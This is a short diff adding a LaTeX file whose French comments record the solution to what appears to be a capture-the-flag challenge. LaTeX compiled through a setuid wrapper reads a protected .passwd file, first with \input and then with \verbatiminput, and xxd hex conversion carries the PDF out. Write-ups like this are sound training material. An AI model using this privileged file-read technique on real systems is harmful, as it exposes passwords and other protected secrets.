@@ -1,0 +1,26 @@
+% Solution :
+%     - on crée le fichier suivant dans tmp avec vim
+    
+    
+
+\documentclass{article}
+\begin{document}
+
+\input{/challenge/app-script/ch23/.passwd}
+
+\end{document}
+
+
+    % - on compile avec setuid-wrapper
+    % - pour récuperer le pdf, on le convertit en hexa : xdd -plain /ficher.pdf
+    % - on le colle dans un fichier en local et on le reconvertit en pdf : xxd -plain -revert /fichier.hex > fichier.pdf
+    % - avec input, ça ne marche pas car le flag est en commentaire, donc on utilise verbatiminput :
+
+\documentclass{article}
+\usepackage{verbatim}
+
+\begin{document}
+
+\verbatiminput{/challenge/app-script/ch23/.passwd}
+
+\end{document}
